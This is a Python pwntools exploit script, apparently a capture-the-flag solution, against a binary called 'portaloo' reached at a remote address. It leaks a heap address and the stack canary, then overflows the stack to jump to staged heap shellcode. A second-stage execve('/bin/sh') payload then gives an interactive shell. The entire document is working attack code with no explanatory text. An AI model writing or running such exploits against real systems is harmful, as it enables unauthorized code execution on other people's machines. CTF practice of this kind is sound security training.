from pwn import *

context.binary = binary = ELF('./portaloo', checksec=False)
libc = ELF('./glibc/libc.so.6', checksec=False)

p = remote('94.237.63.240',51679)
#p = process()

for i in range(2):
	p.sendlineafter(b'> ', b'1')
	p.sendlineafter(b': ', str(i).encode())

p.sendlineafter(b'> ', b'2')
p.sendlineafter(b': ', b'1')
p.sendlineafter(b'> ', b'4')

p.recvuntil(b'Coordinate: 1 ---- Data: ')
heap_base = u64(p.recvline()[:-1].ljust(8, b'\x00')) << 12
info(f'heap base: {hex(heap_base)}')
shellcode_addr = heap_base+0x2a0

shellcode = asm(f'''
	mov rsi, {heap_base+0x400}
	mov eax, 0
	syscall

	jmp rsi
		''')

shellcode2 = asm('''
	lea rdi, [rip+binsh]
	xor esi, esi
	xor edx, edx
	mov eax, 59
	syscall

	binsh:
	.string "/bin/sh"
		''')


p.sendlineafter(b'> ', b'3')
p.sendlineafter(b': ', b'0')
p.sendlineafter(b'data: ', shellcode)

p.sendlineafter(b'> ', b'5')
p.sendlineafter(b'> ', b'a'*72)

p.recvuntil(b'a'*72+b'\n')
canary = u64(b'\x00' + p.recv(7))
info(f'Canary: {hex(canary)}')

rop1 = b'a'*72
rop1 += p64(canary)
rop1 += b'b'*8
rop1 += p64(shellcode_addr)
rop1 += p64(shellcode_addr)

p.send(rop1)
p.send(shellcode2)

p.recvrepeat(1)
print('*** SHELL ***')
p.interactive()
